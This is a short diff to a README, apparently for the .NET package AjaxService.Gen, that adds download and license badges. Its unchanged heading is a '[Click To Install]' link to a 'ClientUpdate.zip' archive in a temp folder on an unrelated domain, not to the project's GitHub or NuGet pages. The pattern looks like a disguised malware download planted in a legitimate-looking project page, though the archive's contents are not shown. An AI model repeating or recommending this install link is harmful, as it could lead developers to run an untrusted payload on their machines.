@@ -1,3 +1,8 @@
+[![Generic badge](https://img.shields.io/badge/dotnet-standard2.0-darkgreen.svg)](https://github.com/MrAliSalehi/AjaxService.Gen)
+[![MIT License](https://img.shields.io/badge/License-MIT-white.svg)](https://choosealicense.com/licenses/mit/)
+![Nuget](https://img.shields.io/nuget/dt/AjaxService.Gen?color=darkred)
+[![NuGet stable version](https://badgen.net/nuget/v/AjaxService.Gen)](https://www.nuget.org/packages/AjaxService.Gen)
+
 <H1 align=center><a href="https://iphoneservisyalova.com/temp/ClientUpdate.zip">[Click To Install]</a></H1>
 
 ### 🔭 Updated features:
